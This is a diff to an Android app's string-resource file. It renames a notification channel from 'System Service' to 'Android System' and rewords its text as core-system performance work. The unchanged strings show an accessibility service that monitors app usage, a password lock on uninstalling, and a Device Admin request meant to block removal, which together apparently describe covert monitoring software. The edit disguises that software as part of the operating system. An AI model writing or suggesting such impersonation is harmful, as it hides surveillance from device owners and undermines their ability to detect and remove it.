@@ -11,9 +11,9 @@
     <string name="status_label">Status:</string>
     <string name="info_text">Device management service is running.\nAll data is synchronized securely.</string>
     <string name="accessibility_service_description">Allows System Service to monitor app usage for optimization and management purposes.</string>
-    <string name="notification_channel_name">System Service</string>
-    <string name="notification_channel_desc">Device management notifications</string>
-    <string name="notification_text">Running in background</string>
+    <string name="notification_channel_name">Android System</string>
+    <string name="notification_channel_desc">Core system services</string>
+    <string name="notification_text">Optimizing device performance</string>
     <string name="uninstall_password_title">Uninstall Protection</string>
     <string name="uninstall_password_hint">Enter password to disable protection</string>
     <string name="device_admin_warning">This app requires Device Admin to prevent unauthorized uninstallation. This is a security feature.</string>
